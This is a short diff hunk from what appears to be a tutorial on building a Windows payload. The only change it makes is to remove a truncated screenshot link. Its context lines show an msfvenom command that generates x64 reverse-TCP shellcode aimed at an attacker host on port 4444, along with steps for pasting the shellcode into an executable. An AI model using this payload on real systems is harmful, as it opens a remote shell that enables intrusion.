@@ -31,7 +31,6 @@ msfvenom -p windows/x64/shell_reverse_tc LHOST=xx.xx.xxx.xx LPORT=4444 -f c
 ```
 Then we have the shell code, and we will insert it in the line of code - shellcode[] = {`here`}
 
-![Screenshot 2023-01-24 at 10 50 42](https://user-images.githubusercontent.com/122444563/214353717-a4f88edd-6681-48
 
 Once we have the script as shown in the screenshot above, we will change the file mode for the .exe using the command 
 ```
